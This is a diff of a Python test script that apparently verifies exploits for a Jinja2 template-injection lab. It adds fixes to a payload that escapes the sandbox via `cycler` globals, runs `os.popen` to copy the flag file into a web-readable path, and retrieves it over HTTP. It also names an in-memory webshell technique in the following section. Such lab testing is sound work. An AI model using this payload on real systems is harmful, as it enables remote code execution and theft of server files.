@@ -110,14 +110,23 @@ def main() -> int:
     # ---------------------------------------------------------------- 3
     section("3. 写文件侧信道（无回显 + 不出网时的带外）")
 
+    # ⚠️ 必须 `.read()`：`os.popen(cmd)` 只是**启动**子进程，不等待它结束。
+    #    不调用 read() 就直接去 GET 文件会与写进程赛跑（曾偶发失败）。
+    #    `.read()` 会阻塞到子进程关闭管道（即执行完毕），让这一步变成确定性操作。
     p_file = (
         "{%set u=cycler.__init__.__globals__.__builtins__%}"
-        "{%set _=u.__import__('os').popen('cat<" + FLAG_PATH + ">/app/echo/exfil.txt')%}"
+        "{%set _=u.__import__('os').popen('cat<" + FLAG_PATH + ">/app/echo/exfil.txt').read()%}"
     )
     host_payload(s, p_file)
-    r = s.get(BASE + "/echo/exfil.txt", timeout=10)
-    check("经 /echo/ 取回命令输出", r.status_code == 200, str(r.status_code))
-    check("取回内容就是 flag", r.text.strip() == flag, repr(r.text))
+    r = None
+    for _ in range(10):  # 再兜一层：等文件可见（不同文件系统刷盘时机不同）
+        r = s.get(BASE + "/echo/exfil.txt", timeout=10)
+        if r.status_code == 200 and r.text.strip():
+            break
+        time.sleep(0.2)
+    check("经 /echo/ 取回命令输出", r is not None and r.status_code == 200,
+          str(getattr(r, "status_code", "no-response")))
+    check("取回内容就是 flag", r is not None and r.text.strip() == flag, repr(r.text if r else ""))
 
     # ---------------------------------------------------------------- 4
     section("4. 路由型内存马（绕过 setupmethod 保护）")
